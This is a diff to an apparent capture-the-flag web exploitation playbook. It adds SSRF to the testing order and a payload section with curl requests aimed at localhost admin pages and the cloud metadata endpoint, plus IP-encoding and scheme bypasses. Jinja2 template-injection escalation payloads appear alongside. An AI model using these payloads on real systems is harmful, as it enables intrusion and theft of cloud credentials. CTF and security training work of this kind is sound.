@@ -10,7 +10,7 @@ URL or web app in scope; HTTP service on a port; login form or cookie/JWT in pla
 
 1. Enumerate directories, endpoints, and tech stack.
 2. Identify the stack (language, framework, CMS, server headers).
-3. Test each applicable injection class in order: SQLi, NoSQLi, SSTI, command injection, XSS, directory traversal, file upload.
+3. Test each applicable injection class in order: SQLi, NoSQLi, SSTI, command injection, XSS, SSRF, directory traversal, file upload.
 4. Exploit the confirmed vulnerability.
 5. Loot the flag from the filesystem, database, or admin area.
 
@@ -67,6 +67,14 @@ ${7*7}
 # Jinja2 escalation
 {{config}}
 {{''.__class__.__mro__[-1].__subclasses__()}}
+```
+
+**Server-side request forgery (SSRF)**
+```bash
+# Point a URL/fetch param at internal targets to reach the flag service or metadata
+curl "<url>?url=http://127.0.0.1/admin"
+curl "<url>?url=http://169.254.169.254/latest/meta-data/"   # cloud metadata
+# Bypasses: alternate IP encodings (0x7f.0.0.1, 2130706433), [::1], file:// , gopher://
 ```
 
 **Directory traversal**
